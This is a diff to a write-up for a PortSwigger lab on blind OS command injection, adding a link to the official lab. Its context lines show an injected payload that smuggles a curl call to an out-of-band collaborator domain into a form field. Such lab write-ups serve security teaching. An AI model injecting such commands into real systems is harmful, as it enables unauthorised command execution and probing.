@@ -44,3 +44,9 @@ we successfully received 2 DNS lookups, which means the feedback function is ind
 `;curl bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;# `
 
 ![](./images/049eda6ceb9c_003.png)
+
+## PortSwigger Lab
+
+**Official lab:** Blind OS command injection with out-of-band interaction
+
+**PortSwigger:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
